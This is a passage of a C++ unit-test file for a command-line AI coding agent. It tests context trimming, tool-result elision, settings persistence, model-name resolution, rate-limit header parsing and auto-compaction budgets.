        Message(Role::SYSTEM, "s"),
        assistant("a", "read_file", "{\"path\":\"/x\"}"),
        result("a", "OLD-X " + big),
        assistant("b", "edit_file", "{\"path\":\"/x\"}"),
        result("b", "EDIT-X " + big),
        assistant("c", "read_file", "{\"path\":\"/y\"}"),
        result("c", "ONLY-Y " + big),
        assistant("d", "run_command", "{\"command\":\"make\"}"),
        result("d", "BUILD1 " + big),
        assistant("e", "run_command", "{\"command\":\"make\"}"),
        result("e", "BUILD2 " + big),
    };

    auto out = agent::Conversation::supersede_stale_tools(msgs);
    check(out.size() == msgs.size(), "message count unchanged (pairing preserved)");
    auto body = [&](const std::string& id) {
        for ( const auto& m : out )
            if ( m.role == Role::TOOL && m.tool_call_id.value_or("") == id ) return m.content;
        return std::string("<missing>");
    };
    check(body("a").find("superseded") != std::string::npos, "older read of /x elided");
    check(body("a").find("OLD-X") == std::string::npos, "elided body dropped");
    check(body("b").find("EDIT-X") != std::string::npos, "newest for /x kept in full");
    check(body("c").find("ONLY-Y") != std::string::npos, "sole result for /y kept");
    check(body("d").find("superseded") != std::string::npos, "older run of `make` elided");
    check(body("e").find("BUILD2") != std::string::npos, "newest run of `make` kept");

    bool a_valid = false;
    for ( const auto& m : out )
        if ( m.role == Role::TOOL && m.tool_call_id.value_or("") == "a" ) a_valid = true;
    check(a_valid, "elided result keeps its tool_call_id");
}

static void test_tool_supersession_extended() {
    std::cout << "extended tool supersession (grep, dir, symbol, refs)" << std::endl;
    using agent::Message; using agent::Role; using agent::ToolCall;
    std::string big(500, 'X');
    auto assistant = [](const std::string& id, const std::string& tool, const std::string& args) {
        Message m(Role::ASSISTANT, "");
        m.tool_calls.push_back(ToolCall{ id, tool, args });
        return m;
    };
    auto result = [](const std::string& id, const std::string& body) {
        return Message(Role::TOOL, body, id, "tool");
    };

    std::vector<Message> msgs = {
        Message(Role::SYSTEM, "s"),
        assistant("d1", "list_directory", "{\"path\":\".\"}"),
        result("d1", "DIR1 " + big),
        assistant("d2", "list_directory", "{\"path\":\".\"}"),
        result("d2", "DIR2 " + big),
        assistant("g1", "grep", "{\"pattern\":\"foo\",\"path\":\".\"}"),
        result("g1", "GREP1 " + big),
        assistant("g2", "grep", "{\"pattern\":\"foo\",\"path\":\".\"}"),
        result("g2", "GREP2 " + big),
        assistant("s1", "find_symbol", "{\"name\":\"MyClass\"}"),
        result("s1", "SYM1 " + big),
        assistant("s2", "find_symbol", "{\"name\":\"MyClass\"}"),
        result("s2", "SYM2 " + big),
        assistant("r1", "find_references", "{\"name\":\"my_fn\"}"),
        result("r1", "REF1 " + big),
        assistant("r2", "find_references", "{\"name\":\"my_fn\"}"),
        result("r2", "REF2 " + big),
    };

    auto out = agent::Conversation::supersede_stale_tools(msgs);
    auto body = [&](const std::string& id) {
        for ( const auto& m : out )
            if ( m.role == Role::TOOL && m.tool_call_id.value_or("") == id ) return m.content;
        return std::string("<missing>");
    };

    check(body("d1").find("superseded by a later listing of .") != std::string::npos, "older list_directory elided");
    check(body("d2").find("DIR2") != std::string::npos, "newest list_directory kept");
    check(body("g1").find("superseded by a later grep in .") != std::string::npos, "older grep elided");
    check(body("g2").find("GREP2") != std::string::npos, "newest grep kept");
    check(body("s1").find("superseded by a later lookup of MyClass") != std::string::npos, "older find_symbol elided");
    check(body("s2").find("SYM2") != std::string::npos, "newest find_symbol kept");
    check(body("r1").find("superseded by a later reference search for my_fn") != std::string::npos, "older find_references elided");
    check(body("r2").find("REF2") != std::string::npos, "newest find_references kept");
}

static void test_large_tool_result_elision() {
    std::cout << "large old tool-result elision" << std::endl;
    using agent::Message; using agent::Role;
    std::vector<Message> msgs;
    msgs.push_back(Message(Role::SYSTEM, "s"));
    std::string large(9000, 'L');
    for ( int i = 0; i < 10; ++i ) {
        msgs.push_back(Message(Role::TOOL, large + std::to_string(i), "id" + std::to_string(i), "read_file"));
    }

    auto out = agent::Conversation::elide_old_large_tool_results(msgs);
    check(out.size() == msgs.size(), "large-result elision preserves message count");
    check(out[1].content.find("older large tool result elided") != std::string::npos,
          "old large tool result is elided");
    check(out[1].content.find("900") != std::string::npos, "elision marker includes size");
    check(out[2].content.find("older large tool result elided") != std::string::npos,
          "second old large result is elided");
    check(out.back().content.find("LLLL") != std::string::npos, "recent large tool result stays intact");

    // Test with 4 messages: older than 2 are elided if > 2500 chars, kept if <= 2500 chars
    std::vector<Message> small_flow;
    small_flow.push_back(Message(Role::SYSTEM, "sys"));
    small_flow.push_back(Message(Role::TOOL, std::string(3000, 'A'), "t1", "read_file")); // >2500, old -> elide
    small_flow.push_back(Message(Role::TOOL, std::string(1500, 'B'), "t2", "read_file")); // <=2500, old -> keep
    small_flow.push_back(Message(Role::TOOL, std::string(4000, 'C'), "t3", "read_file")); // recent -> keep
    small_flow.push_back(Message(Role::TOOL, std::string(4000, 'D'), "t4", "read_file")); // recent -> keep

    auto out2 = agent::Conversation::elide_old_large_tool_results(small_flow);
    check(out2[1].content.find("older large tool result elided") != std::string::npos, "old >2500 result elided");
    check(out2[2].content == std::string(1500, 'B'), "old <=2500 result kept intact");
    check(out2[3].content == std::string(4000, 'C'), "recent large result 1 kept intact");
    check(out2[4].content == std::string(4000, 'D'), "recent large result 2 kept intact");

    // Pre-elision budgeting: A conversation with old large tool results should NOT
    // drop the first user turn when budgeted if the elided size easily fits in budget.
    agent::Conversation c_elide;
    c_elide.set_system("system prompt");
    c_elide.add_user("first user message");
    c_elide.add_tool_result("t1", std::string(10000, 'X'), "read_file"); // old large
    c_elide.add_tool_result("t2", std::string(10000, 'Y'), "read_file"); // old large
    c_elide.add_user("second user message");
    c_elide.add_tool_result("t3", "short1", "read_file");
    c_elide.add_tool_result("t4", "short2", "read_file");
    c_elide.add_user("third user message");

    agent::Config test_cfg;
    test_cfg.context_limit = 1500;
    test_cfg.context_auto = false;
    test_cfg.provider = "openai";
    agent::providers::OpenAI prov(test_cfg);
    auto req_msgs = prov.request_messages(c_elide);
    check(req_msgs.size() == c_elide.messages().size(),
          "pre-elision budgeting keeps history that fits after eliding large tools");
    check(req_msgs[1].content == "first user message", "first user message preserved");
}

static void test_trim_hysteresis() {
    std::cout << "cache-stable trimming (hysteresis)" << std::endl;
    agent::Conversation c;
    c.set_system(std::string(40, 's'));
    for ( int i = 0; i < 12; ++i )
        c.add_user(std::string(400, 'u')); // ~108 tokens each

    // First over-budget call cuts to ~70% and pins. The oldest kept message is
    // the pin boundary.
    const size_t budget = 500;
    auto a = c.within_token_budget(budget);
    std::string oldest_a = a.size() > 1 ? a[1].content : "";
    check(a.size() < c.messages().size() + 0, "trimmed under budget");

    // Adding one message that still fits under budget must NOT move the cut —
    // the request prefix stays byte-identical (the win for prompt caching).
    c.add_user(std::string(400, 'u'));
    auto b = c.within_token_budget(budget);
    std::string oldest_b = b.size() > 1 ? b[1].content : "";
    check(oldest_a == oldest_b, "cut stays pinned as history grows within headroom");

    // Push well past the budget: the cut must move forward (re-cut).
    for ( int i = 0; i < 6; ++i )
        c.add_user(std::string(400, 'u'));
    auto d = c.within_token_budget(budget);
    check(d.size() < b.size() + 8, "re-cut keeps the sent set bounded");
    // Every returned set stays within budget-ish and keeps system + newest.
    check(d.front().role == agent::Role::SYSTEM && d.back().content == std::string(400, 'u'),
          "system + newest always kept");

    // If the whole thing fits, the cut un-pins (everything included).
    agent::Conversation small;
    small.set_system("s");
    small.add_user("one");
    small.add_user("two");
    check(small.within_token_budget(100000).size() == 3, "un-pins when the full history fits");
}

static void test_settings_persistence() {
    std::cout << "settings persistence" << std::endl;
    std::string home = "/tmp/ai_agent_persist_test";
    std::filesystem::create_directories(home);
    agent::Config::save_last_used(home, "kimi", "kimi-for-coding");

    agent::Config c;
    c.theme = "warm"; c.multiline = true; c.thinking = "on"; c.thinking_stream = false;
    c.thinking_collapse = true;
    c.context_auto = true; c.context_limit = 65536; c.paste_preview = 12;
    c.auto_compact = true;
    c.advisor = true; c.advisor_model = "claude-sonnet-4-6";
    c.save_settings(home);

    auto last = agent::Config::load_last_used(home);
    check(last.provider == "kimi", "provider preserved across save_settings");
    check(last.model_for("kimi") == "kimi-for-coding", "model preserved across save_settings");
    check(last.has_settings, "settings block present");
    check(last.theme == "warm", "theme persisted");
    check(last.multiline, "multiline persisted");
    check(!last.thinking_stream, "thinking_stream persisted");
    check(last.thinking == "on", "thinking persisted");
    check(last.context_auto, "context_auto persisted");
    check(last.context_limit == 65536, "context_limit persisted");
    check(last.thinking_collapse, "thinking_collapse persisted");
    check(last.paste_preview == 12, "paste_preview persisted");
    check(last.auto_compact, "auto_compact persisted");
    check(last.advisor, "advisor persisted");
    check(last.advisor_model == "claude-sonnet-4-6", "advisor_model persisted");

    agent::Config c2;
    c2.apply_settings(last);
    check(c2.theme == "warm" && c2.multiline && c2.thinking == "on" && c2.context_limit == 65536,
          "apply_settings restores onto a fresh config");
    check(c2.thinking_collapse && c2.paste_preview == 12, "apply_settings restores collapse + paste_preview");
    check(c2.auto_compact, "apply_settings restores auto_compact");
    check(c2.advisor && c2.advisor_model == "claude-sonnet-4-6", "apply_settings restores advisor + model");

    std::filesystem::remove_all(home);
}

static void test_model_resolution() {
    std::cout << "model name resolution" << std::endl;
    using agent::Config;

    // An exact name is never rewritten.
    auto exact = Config::resolve_model("claude", "claude-sonnet-4-6");
    check(exact.model == "claude-sonnet-4-6" && !exact.corrected, "exact name kept as is");

    // Family shorthand -> the real model.
    check(Config::resolve_model("claude", "fable").model == "claude-fable-5", "fable -> claude-fable-5");
    check(Config::resolve_model("claude", "opus").model == "claude-opus-5", "opus -> newest opus");
    check(Config::resolve_model("anthropic", "haiku").model == "claude-haiku-4-5-20251001", "haiku -> haiku");
    check(Config::resolve_model("claude", "fable").corrected, "a rewrite is reported as corrected");

    // Typos land on the intended model.
    check(Config::resolve_model("claude", "sonet").model == "claude-sonnet-4-6", "sonet -> sonnet (fuzzy)");
    check(Config::resolve_model("claude", "claude-opus").model == "claude-opus-5", "prefix -> full name");
    check(Config::resolve_model("claude", "Claude Opus 4.8").model == "claude-opus-4-8", "separators/case ignored");

    // Other providers.
    check(Config::resolve_model("openai", "4o").model == "gpt-4o", "4o -> gpt-4o");
    check(Config::resolve_model("openai", "gpt-4o-mini").model == "gpt-4o-mini", "openai exact kept");
    check(Config::resolve_model("moonshot", "k2").model == "kimi-k2-0905-preview", "k2 -> newest kimi-k2");

    // A version the user spelled out is never fuzzed onto a different version:
    // the curated list always lags behind new releases, so a name carrying its
    // own version must reach the API untouched rather than be "corrected" back
    // to the older model it happens to be one or two edits away from.
    check(Config::resolve_model("claude", "claude-opus-5").model == "claude-opus-5",
          "a newer version is not downgraded to the curated one");
    check(!Config::resolve_model("claude", "claude-sonnet-5").corrected,
          "an unreleased version passes through untouched");
    check(Config::resolve_model("claude", "claude-opus-9-9").model == "claude-opus-9-9",
          "a future version is never rewritten");

    // Never invent a name we cannot justify.
    check(Config::resolve_model("claude", "totally-unknown-model").model == "totally-unknown-model",
          "unknown name passes through");
    check(!Config::resolve_model("claude", "totally-unknown-model").corrected, "unknown is not a correction");
    check(Config::resolve_model("ollama", "fable").model == "fable",
          "providers with a user-defined namespace are untouched");
    check(Config::resolve_model("claude", "").model.empty(), "empty input stays empty");

    // A live listing overrides the curated set.
    std::vector<std::string> live = { "custom-tuned-7b", "custom-tuned-70b" };
    check(Config::resolve_model("ollama", "custom-tuned-7", live).model == "custom-tuned-7b",
          "matches against a provider listing");

    // The picker's shortlist is shared with the resolver.
    check(!Config::known_models_for("claude").empty(), "claude has a curated shortlist");
    check(Config::known_models_for("ollama").empty(), "ollama has no curated shortlist");
    check(!Config::known_models_for("codex").empty(), "codex has a curated shortlist");
    check(Config::resolve_model("codex", "5.7").model == "5.7", "unlisted Codex model remains explicit");
    // The alias table is global: "mini" first expands to gpt-4o-mini, which Codex
    // does not offer; falling back to the typed family shorthand should then land
    // on Codex's own mini model.
    check(Config::resolve_model("codex", "mini").model == "gpt-5.4-mini",
          "a generic mini shorthand lands on Codex's mini model");
    check(Config::resolve_model("codex", "gpt").model == "gpt-5.6",
          "a generic alias still lands on this provider's newest model");
    check(Config::resolve_model("openai", "mini").model == "gpt-4o-mini",
          "the alias still wins where it does apply");

    // The [1m] annotation is a capability tag, not part of the model name: it must
    // survive resolution (including a shorthand rewrite) and never leak into the
    // name sent to the API.
    auto tagged_exact = Config::resolve_model("claude", "claude-sonnet-4-6[1m]");
    check(tagged_exact.model == "claude-sonnet-4-6[1m]", "an annotated exact name keeps its tag");
    auto tagged_short = Config::resolve_model("claude", "sonnet[1m]");
    check(tagged_short.model == "claude-sonnet-4-6[1m]", "a shorthand resolves and keeps the tag");
    check(Config::base_model_name(tagged_short.model) == "claude-sonnet-4-6",
          "the API receives the base name, without the tag");
    check(Config::model_requests_1m_context(tagged_short.model), "the tag requests 1M context");
    check(!Config::model_requests_1m_context("claude-sonnet-4-6"), "an untagged name does not");
}

static void test_1m_context_header() {
    std::cout << "1M context beta header" << std::endl;
    using agent::providers::Anthropic;

    auto has_1m_header = [](const agent::Config& c) {
        Anthropic p(c);
        for ( const auto& h : p.extra_headers())
            if ( h.first == "anthropic-beta" && h.second == "context-1m-2025-08-07" )
                return true;
        return false;
    };

    // The beta header is opt-in: sent only for an annotated model, because
    // sending it unconditionally would change behaviour for every request.
    agent::Config plain; plain.provider = "anthropic"; plain.model = "claude-sonnet-4-6";
    check(!has_1m_header(plain), "no 1M beta header without the tag");

    agent::Config tagged; tagged.provider = "anthropic"; tagged.model = "claude-sonnet-4-6[1m]";
    check(has_1m_header(tagged), "the tag sends the 1M beta header");

    // The tag widens the context budget but must not change the output ceiling —
    // they are independent limits.
    check(agent::Config::context_window_for("claude-sonnet-4-6[1m]") == 1000000,
          "the tag widens the context window");
    check(Anthropic::output_cap_for("claude-sonnet-4-6[1m]") ==
          Anthropic::output_cap_for("claude-sonnet-4-6"),
          "the tag does not change the output ceiling");

    // The request carries the base name, never the annotation.
    Anthropic p(tagged);
    agent::Conversation cv; cv.set_system("s"); cv.add_user("hi");
    JSON req = p.build_request(cv, JSON::Array{});
    check(req["model"].to_string() == "claude-sonnet-4-6", "the request sends the base model name");

    // The Claude (OAuth) provider inherits the header alongside its own beta.
    agent::Config claude_cfg; claude_cfg.provider = "claude";
    claude_cfg.model = "claude-sonnet-4-6[1m]";
    agent::providers::Claude cp(claude_cfg);
    bool has_oauth = false, has_1m = false;
    for ( const auto& h : cp.extra_headers()) {
        if ( h.first == "anthropic-beta" && h.second == "oauth-2025-04-20" ) has_oauth = true;
        if ( h.first == "anthropic-beta" && h.second == "context-1m-2025-08-07" ) has_1m = true;
    }
    check(has_oauth && has_1m, "the claude provider sends both beta headers");
}

static void test_rate_limit_parsing() {
    std::cout << "rate-limit decoding" << std::endl;
    using agent::api::parse_rate_limit;
    using agent::api::describe_rate_limit;
    using agent::api::RateLimitInfo;
    using agent::api::human_duration;
    using agent::api::parse_rfc3339;

    const std::time_t now = 1800000000; // fixed "now" so every case is deterministic

    // RFC 3339 parsing, including offsets and fractional seconds.
    std::time_t t = 0;
    check(parse_rfc3339("2027-01-15T10:30:00Z", t) && t == 1800009000, "RFC3339 Z parsed");
    std::time_t t2 = 0;
    check(parse_rfc3339("2027-01-15T13:30:00+03:00", t2) && t2 == t, "RFC3339 offset normalised to UTC");
    std::time_t t3 = 0;
    check(parse_rfc3339("2027-01-15T10:30:00.123456Z", t3) && t3 == t, "fractional seconds ignored");
    std::time_t t4 = 0;
    check(!parse_rfc3339("not-a-timestamp", t4), "garbage rejected");

    // retry-after in seconds is the most direct signal.
    {
        auto info = parse_rate_limit({ { "retry-after", "90" } }, "", now);
        check(info.has_reset && info.seconds_until == 90, "retry-after seconds honoured");
    }

    // Anthropic's session (unified) reset is unix epoch, and marks a session
    // limit rather than an ordinary per-minute rate limit.
    {
        auto info = parse_rate_limit(
            { { "anthropic-ratelimit-unified-reset", std::to_string(now + 3600) } }, "", now);
        check(info.kind == RateLimitInfo::Kind::Session, "unified header means a session limit");
        check(info.seconds_until == 3600, "session reset time decoded");
        std::string msg = describe_rate_limit(info);
        check(msg.find("usage limit has been reached") != std::string::npos, "message names the usage limit");
        check(msg.find("Resets at") != std::string::npos, "message states the reset time");
    }

    // The exhausted bucket wins over one that merely resets sooner: it is the
    // one that actually blocked the request.
    {
        auto info = parse_rate_limit({
            { "anthropic-ratelimit-requests-reset",      "2027-01-15T10:30:00Z" },
            { "anthropic-ratelimit-requests-remaining",  "42" },
            { "anthropic-ratelimit-input-tokens-reset",  "2027-01-15T11:00:00Z" },
            { "anthropic-ratelimit-input-tokens-remaining", "0" },
        }, "", now);
        check(info.scope == "input tokens", "the exhausted bucket is reported");
        check(info.reset_at == 1800010800, "its reset time is used");
    }

    // A spend cap is NOT something waiting fixes — it must not be described as
    // a transient rate limit.
    {
        std::string body = R"({"error":{"type":"rate_limit_error","message":"You have reached )"
                           R"(your API usage limits","details":{"error_code":"enforced_spend_limit_reached"}}})";
        auto info = parse_rate_limit({}, body, now);
        check(info.kind == RateLimitInfo::Kind::SpendCap, "spend cap detected from the body");
        std::string msg = describe_rate_limit(info);
        check(msg.find("usage limit has been reached") != std::string::npos, "message names the usage limit");
        check(msg.find("Retrying will not help") != std::string::npos, "message says retrying is futile");
    }

    // OpenAI-style Go durations, and OpenRouter's epoch-milliseconds.
    {
        auto info = parse_rate_limit({ { "x-ratelimit-reset-tokens", "6m0s" } }, "", now);
        check(info.seconds_until == 360, "Go duration 6m0s decoded");
    }
    {
        auto info = parse_rate_limit({ { "x-ratelimit-reset-requests", "1.5s" } }, "", now);
        check(info.seconds_until == 2, "fractional Go duration rounds up");
    }
    {
        auto info = parse_rate_limit(
            { { "x-ratelimit-reset", std::to_string((now + 120) * 1000LL) } }, "", now);
        check(info.seconds_until == 120, "epoch milliseconds detected and scaled");
    }

    // A reset already in the past must not produce a negative countdown.
    {
        auto info = parse_rate_limit(
            { { "anthropic-ratelimit-unified-reset", std::to_string(now - 500) } }, "", now);
        check(info.seconds_until == 0, "a past reset clamps to zero");
    }

    // No usable headers: still classified, but honest about not knowing.
    {
        auto info = parse_rate_limit({}, "", now);
        check(info.kind == RateLimitInfo::Kind::Rate && !info.has_reset, "bare 429 is a plain rate limit");
        check(describe_rate_limit(info).find("did not say when") != std::string::npos,
              "message admits the reset is unknown");
    }

    // Readable durations.
    check(human_duration(45) == "45s", "seconds formatted");
    check(human_duration(750) == "12m 30s", "minutes+seconds formatted");
    check(human_duration(7500) == "2h 5m", "hours+minutes formatted");
    check(human_duration(0) == "now", "zero reads as now");
}

static void test_output_cap() {
    std::cout << "output-token cap" << std::endl;
    using agent::providers::Anthropic;

    // Every known family gets its real ceiling. The old code special-cased
    // "sonnet" and gave everything else 32000, which silently halved the output
    // ceiling of newer Opus models.
    check(Anthropic::output_cap_for("claude-opus-5") == 128000, "opus-5 ceiling is 128000");
    check(Anthropic::output_cap_for("claude-opus-4-8") == 64000, "opus-4-8 ceiling is 64000");
    check(Anthropic::output_cap_for("claude-sonnet-4-6") == 64000, "sonnet ceiling is 64000");
    check(Anthropic::output_cap_for("claude-fable-5") == 128000, "fable ceiling is 128000");
    check(Anthropic::output_cap_for("some-unknown-model") == 32000, "unknown falls back to 32000");

    // A configured max_tokens above the ceiling is clamped, not passed through
    // (Anthropic 400s otherwise) — and the reply is capped at the ceiling.
    agent::Config c; c.provider = "anthropic"; c.model = "claude-opus-5"; c.max_tokens = 128000;
    Anthropic p(c);
    agent::Conversation cv; cv.set_system("s"); cv.add_user("hi");
    JSON r = p.build_request(cv, JSON::Array{});
    check(static_cast<long long>(r["max_tokens"]) == 128000, "max_tokens clamped to the ceiling");

    // The default is high enough that a substantial edit is not cut off, while
    // still fitting inside every model's ceiling.
    agent::Config d;
    check(d.max_tokens == 64000, "default max_tokens is 64000");
    check(static_cast<long>(d.max_tokens) <= Anthropic::output_cap_for("claude-opus-5"),
          "the default fits inside the model ceiling");
}

static void test_context_defaults() {
    std::cout << "context defaults + migration" << std::endl;
    agent::Config d;
    check(d.context_auto, "context_auto defaults to on");
    check(d.auto_compact, "auto_compact defaults to on");
    // With auto on, a long session is trimmed instead of growing until the API
    // rejects it.
    check(d.context_budget() > 0, "a default config has a finite context budget");

    // An old state file (no settings_version) that never set a context limit is
    // migrated to the new defaults when it is loaded, and the migrated values are
    // what get persisted from then on.
    std::string home = "/tmp/ai_migrate_test";
    std::filesystem::remove_all(home);
    std::filesystem::create_directories(home);
    {
        std::ofstream o(home + "/state.json");
        o << R"({"provider":"claude","models":{"claude":"claude-opus-5"},"settings":{)"
             R"("theme":"dark","context_auto":false,"context_limit":0,"auto_compact":false}})";
    }
    auto migrated_state = agent::Config::load_last_used(home);
    check(migrated_state.context_auto && migrated_state.auto_compact,
          "old state migrates to the new defaults on load");
    check(migrated_state.settings_version == agent::Config::SETTINGS_VERSION,
          "migrated state carries the current version");

    // Re-saving must persist the migrated values, not silently stamp the version
    // onto the old ones (which would make the migration a no-op forever after).
    agent::Config::save_last_used(home, "claude", "claude-opus-5");
    auto reloaded = agent::Config::load_last_used(home);
    check(reloaded.context_auto && reloaded.auto_compact,
          "migrated values survive a save/reload round-trip");

    // A deliberate context limit is never overridden by the migration.
    {
        std::ofstream o(home + "/state.json");
        o << R"({"provider":"claude","settings":{)"
             R"("theme":"dark","context_auto":false,"context_limit":50000,"auto_compact":false}})";
    }
    auto kept_state = agent::Config::load_last_used(home);
    check(!kept_state.context_auto && kept_state.context_limit == 50000,
          "an explicit context limit is preserved");

    // A current state is applied verbatim: an opt-out is not undone.
    {
        std::ofstream o(home + "/state.json");
        o << R"({"provider":"claude","settings":{"settings_version":1,)"
             R"("theme":"dark","context_auto":false,"context_limit":0,"auto_compact":false}})";
    }
    auto optout = agent::Config::load_last_used(home);
    check(!optout.context_auto && !optout.auto_compact, "a deliberate opt-out survives");

    std::filesystem::remove_all(home);
}

static void test_token_formatting() {
    std::cout << "token formatting + parsing" << std::endl;
    using agent::Config;

    // Large numbers are hard to compare as raw digits; the UI shows K/M.
    check(Config::format_tokens(999) == "999", "small counts stay plain");
    check(Config::format_tokens(1000) == "1K", "1000 -> 1K");
    check(Config::format_tokens(32000) == "32K", "32000 -> 32K");
    check(Config::format_tokens(200000) == "200K", "whole thousands drop the decimal");
    check(Config::format_tokens(8192) == "8.2K", "8192 -> 8.2K");
    check(Config::format_tokens(1000000) == "1M", "1000000 -> 1M");
    check(Config::format_tokens(1500000) == "1.5M", "1500000 -> 1.5M");

    // Token counts are decimal: "100K tokens" means 100000, not 102400. Using the
    // 1024-based size parser here would quietly hand out 2.4% more than asked.
    check(Config::parse_tokens("100K", 0) == 100000, "100K = 100000 (decimal, not 1024)");
    check(Config::parse_tokens("32k", 0) == 32000, "lower-case suffix works");
    check(Config::parse_tokens("1.5M", 0) == 1500000, "fractional M");
    check(Config::parse_tokens("64000", 0) == 64000, "plain digits still work");
    check(Config::parse_size_suffixed("100K", 0) == 102400, "the byte parser stays 1024-based");

    // Bad input keeps the previous value rather than zeroing a budget.
    check(Config::parse_tokens("abc", 777) == 777, "garbage keeps the fallback");
    check(Config::parse_tokens("-5", 777) == 777, "negative keeps the fallback");
    check(Config::parse_tokens("", 777) == 777, "empty keeps the fallback");

    // What the UI prints can be typed straight back in.
    for ( size_t v : { size_t(1000), size_t(32000), size_t(200000), size_t(1500000) })
        check(Config::parse_tokens(Config::format_tokens(v), 0) == v, "format/parse round-trip");
}

static void test_budget_persistence() {
    std::cout << "budget persistence" << std::endl;
    std::string home = "/tmp/ai_budget_test";
    std::filesystem::remove_all(home);
    std::filesystem::create_directories(home);

    // Defaults are sized for real work: a first pass over a project routinely
    // runs past the old 50-call limit, and the old 8192-token reply cap cut off
    // ordinary answers.
    agent::Config d;
    check(d.tool_call_limit == 100, "default tool budget is 100 calls");
    check(d.max_tokens == 64000, "default max reply is 64000 tokens");
    check(agent::Config::parse_tool_limit("unlimited", 17) == 0,
          "tool budget parser accepts unlimited");
    check(agent::Config::parse_tool_limit("all", 17) == 0,
          "tool budget parser accepts all");

    // A budget tuned in /settings must survive a restart. These were previously
    // config-file only, so raising the tool budget in the menu silently
    // reverted to 50 on the next launch — the bug this test pins down.
    agent::Config c; c.home_dir = home;
    c.tool_call_limit = 400;
    c.max_tokens = 48000;
    c.save_settings(home);

    auto last = agent::Config::load_last_used(home);
    check(last.tool_call_limit == 400, "tool budget is written to the state file");
    check(last.max_tokens == 48000, "max_tokens is written to the state file");

    agent::Config restored;
    restored.apply_settings(last);
    check(restored.tool_call_limit == 400, "tool budget survives a restart");
    check(restored.max_tokens == 48000, "max_tokens survives a restart");

    // An explicit config-file budget still wins over the persisted one.
    agent::Config from_file;
    from_file.tool_call_limit = 900;
    from_file.tool_call_limit_explicit = true;
    from_file.max_tokens = 12000;
    from_file.max_tokens_explicit = true;
    from_file.apply_settings(last);
    check(from_file.tool_call_limit == 900, "a config-file tool budget is authoritative");
    check(from_file.max_tokens == 12000, "a config-file max_tokens is authoritative");

    std::filesystem::remove_all(home);
}

static void test_compaction_budget() {
    std::cout << "auto-compaction budget" << std::endl;
    agent::Config c;
    c.model = "claude-opus-4-8[1m]";

    // With an explicit budget, compaction measures against it.
    c.context_auto = false;
    c.context_limit = 50000;
    check(c.compaction_budget() == 50000, "explicit context limit is used");
    check(c.auto_compact_max_tokens == 30000, "default auto_compact_max_tokens is 30000");
    check(c.auto_compact_pct == 80, "default auto_compact_pct is 80");

    // "unlimited" used to disable auto-compaction entirely: the trigger compared
    // against a budget of 0 and never fired, so the sessions most in need of
    // compaction were the ones that never got it. Fall back to the model window.
    c.context_auto = false;
    c.context_limit = 0;
    check(c.compaction_budget() > 0, "unlimited context still has a compaction budget");
    check(c.compaction_budget() == static_cast<size_t>(1000000 * 0.85),
          "falls back to the model's window with headroom");

    // Auto mode agrees with the context budget.
    c.context_auto = true;
    check(c.compaction_budget() == c.context_budget(), "auto mode matches the context budget");

    // An unknown model has no window to fall back to.
    agent::Config u;
    u.model = "mystery-model";
    u.context_auto = false;
    u.context_limit = 0;
    check(u.compaction_budget() == 0, "unknown model has no compaction budget");
}

static void test_auto_compact() {
    std::cout << "auto-compact trigger & estimation" << std::endl;
    agent::Conversation conv;
    conv.set_system("You are a helpful assistant.");
    conv.add_user("Please read this file.");
    conv.add_assistant("Reading file...", { agent::ToolCall{"call_1", "read_file", "{\"path\":\"foo.txt\"}"} });
    conv.add_tool_result("call_1", "read_file", "File contents here...");
    conv.add_assistant("Here is the content.");

    size_t est = conv.estimate_tokens();
    check(est > 20, "conversation estimate_tokens produces reasonable count");

    agent::Config cfg;
    cfg.auto_compact = true;
    cfg.auto_compact_max_tokens = 30000;
    cfg.auto_compact_pct = 80;
    cfg.context_auto = false;
    cfg.context_limit = 30000;

    agent::TokenStats stats;
    // Context well below threshold
    stats.context_tokens.store(5000);
    agent::InlineRepl repl1(nullptr, cfg, conv, stats);
    check(!repl1.maybe_auto_compact(), "does not trigger when context is below target");

    // Disabled auto_compact
    cfg.auto_compact = false;
    stats.context_tokens.store(35000);
    agent::InlineRepl repl2(nullptr, cfg, conv, stats);
    check(!repl2.maybe_auto_compact(), "does not trigger when auto_compact is off");
    cfg.auto_compact = true;

    // Unknown model window falls back to auto_compact_max_tokens
    agent::Config ucfg;
    ucfg.model = "unknown-model";
    ucfg.auto_compact = true;
    ucfg.auto_compact_max_tokens = 10000;
    ucfg.auto_compact_pct = 80;
    ucfg.context_auto = false;
    ucfg.context_limit = 0; // budget == 0
    stats.context_tokens.store(8500); // >= 80% of 10000
    agent::InlineRepl repl3(nullptr, ucfg, conv, stats);
    check(repl3.maybe_auto_compact(), "unknown model falls back to auto_compact_max_tokens");

    // Zero context_tokens in stats falls back to conversation token estimation
    stats.context_tokens.store(0);
    ucfg.auto_compact_max_tokens = 50;
    ucfg.auto_compact_pct = 80;
    conv.add_user("A longer prompt to push conversation token estimation over the small limit for testing.");
    agent::InlineRepl repl4(nullptr, ucfg, conv, stats);
    check(repl4.maybe_auto_compact(), "stats context_tokens == 0 falls back to conversation estimate");
}

static void test_context_auto() {
    std::cout << "context auto budget" << std::endl;
    check(agent::Config::context_window_for("claude-opus-4-8") == 200000, "claude window");
    check(agent::Config::context_window_for("claude-opus-4-8[1m]") == 1000000,
          "annotated claude window");
    check(agent::Config::context_window_for("kimi-for-coding") == 256000, "kimi window");
    check(agent::Config::context_window_for("gpt-5.5") == 1000000, "gpt-5.5 window");
    check(agent::Config::context_window_for("gpt-5.4") == 1050000, "gpt-5.4 window");
    check(agent::Config::context_window_for("gpt-5.4-mini") == 400000, "gpt-5.4-mini window");
    check(agent::Config::context_window_for("mystery-model") == 0, "unknown window is 0");

    agent::Config cfg;
    cfg.model = "claude-opus-4-8";
    cfg.context_auto = true;
    check(cfg.context_budget() == static_cast<size_t>(200000 * 0.85), "auto applies response headroom");

    cfg.context_auto = false;
    cfg.context_limit = 5000;
    check(cfg.context_budget() == 5000, "explicit limit used when not auto");

    cfg.model = "mystery-model";
    cfg.context_auto = true;
    check(cfg.context_budget() == 0, "auto with unknown model = unlimited");

    // parse_size must reject a negative (std::stoull would wrap it to a huge value).
    check(agent::Config::parse_size_suffixed("-1", 100) == 100, "negative size rejected (keeps fallback)");
    check(agent::Config::parse_size_suffixed("8K", 0) == 8192, "8K parses to 8192");
}

static void test_conversation_corrupt() {
    std::cout << "corrupt conversation handling" << std::endl;
    std::string path = "/tmp/ai_conv_bad.json";
    { std::ofstream o(path); o << "{ not valid json ["; }
    agent::Conversation c;
    bool threw = false;
    try { c.load(path); } catch ( ... ) { threw = true; }
    check(!threw, "corrupt conversation file does not throw");

    { std::ofstream o(path); o << "{\"a\":1}"; } // valid JSON but not an array
    threw = false;
